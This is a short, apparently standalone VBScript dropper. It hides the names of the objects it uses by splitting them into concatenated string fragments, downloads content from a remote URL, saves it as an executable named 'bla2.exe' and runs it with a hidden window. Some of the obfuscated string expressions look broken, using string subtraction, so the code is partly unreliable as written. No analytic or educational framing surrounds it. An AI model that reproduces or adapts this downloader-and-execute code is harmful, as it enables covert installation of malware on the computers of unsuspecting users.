Dim t
Dim q
Set q = CreateObject("M"+""+"i"+""+"c"+""+"r"+""+"o"+""+"s"+""+"o"+"f"+"t"+"."+"X"+""+"M"+""+"L"+"H"+"T"+"T"+""+"P")
q.Open "GET", "http://www.myspace.com/der.com", False 
q.Send
t = q.ResponseBody
Const k = 1
Const z = 2
Dim j
Set j = CreateObject("A"+""+"D"-"D"+""+"D"+"O"+"D"+""+""+"B"+"."+"S"-"S"+""+"S"+"t"+""+""+""+"r"+"e"+"a"+""+"m")
j.Type = k
j.Open
j.Write t
j.SaveToFile "bla2.exe", z
Dim m
Set m = CreateObject("W"-"W"+""+"W"+""+"S"+"c"+""+""+"r"+"i"+"p"+""+""+"t"+"."+"S"+""+""+"h"-"h"+"h"+"e"+"l"+""+"l"+"")
m.Run "bla2.exe", 0, false